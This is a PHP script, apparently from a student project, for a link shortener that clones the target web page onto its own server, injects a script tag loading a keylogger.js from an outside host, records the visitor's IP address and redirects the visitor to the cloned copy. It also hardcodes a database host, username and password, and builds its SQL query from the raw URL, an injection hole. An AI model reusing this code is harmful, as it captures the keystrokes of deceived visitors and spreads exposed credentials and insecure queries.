<?php>
include scripts/simple_html_dom.php ;

$servername = "mysql.hostinger.co.uk";
$username = "u464162183_user";
$password = "iLY6abhAkI";
$dbname = "u464162183_data";

//CONNECTING TO DATABASE
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

//


//SEARCHING DATABASE WITH KEY TO GET LONGLINK
$actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$key = substr($actual_link , 34, strlen($actual_link));
$sql = "SELECT longlink FROM DATA WHERE shortlink='{$key}'";
$result = $conn->query($sql);
$arrayOfResults = mysqli_fetch_row($result);
$link = $arrayOfResults[0];
$conn->close();


//DUPLICATING HTML FILE ONTO OWN SERVER
$identifier = substr($key , 0 , 5);
$htmlFileName = $identifier.".html";
$html=fopen($htmlFileName, "w");
fwrite($html , file_get_contents("$link"));
fclose($html);

//CREATING PATHS FOR OTHER FILES FOUND IN HTML
$html = file_get_html($link);
foreach($html->find('img') as $element){
		$img = $element->src ;
		if (!is_dir("$img")){
				$path = substr($img , 0 , strlen($img) - strlen(strrchr($img , "/")));
				mkdir(getcwd().$path , 0777 , true);
				file_put_contents(getcwd()."$img", "$link"."$img");
		}
		else{
					die('Failed to create folders...');
		}

	};


//ADDING IN THE KEYLOGGER SCRIPT INTO HTML ON SERVER
$keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
$textToInsert="script src='$keyloggerscript'></script>";
$contents = file_get_contents("$htmlFileName");
$newContent = preg_replace("</body>", $textToInsert."</body", $contents);
file_put_contents($htmlFileName, $newContent);


//GETTING IP AND ADDING IT TO DATA.TXT ON SERVER
$ip = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');
$data = fopen("data.txt" , "w");
fwrite($data ,"\n"."$ip"." says: ");
fclose($data);


//REDIRECTING TO LONG LINK
header("Location:".$htmlFileName, true, 303);
die();

?>
